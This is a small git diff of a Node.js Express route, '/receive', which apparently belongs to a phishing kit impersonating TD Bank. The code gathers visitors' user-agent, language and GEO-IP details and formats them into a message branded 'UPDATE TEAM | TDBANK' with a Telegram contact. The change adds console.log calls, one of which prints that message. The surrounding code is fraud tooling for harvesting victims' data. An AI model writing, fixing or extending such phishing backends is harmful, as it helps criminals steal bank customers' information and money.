@@ -172,6 +172,8 @@ app.post('/receive', async (req, res) => {
         const userAgent = req.headers["user-agent"];
         const systemLang = req.headers["accept-language"];
 
+        console.log("not new");
+        
         const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
         const fullGeoInfo = `🌍 GEO-IP INFO\n` +
@@ -207,6 +209,8 @@ app.post('/receive', async (req, res) => {
                 `========================\n\n` +
                 `✅ UPDATE TEAM | TDBANK\n` +
                 `💬 Telegram: https://t.me/updteams\n`;
+                
+                console.log(message);
             res.send({ url: type });
             responseSent = true;
         };
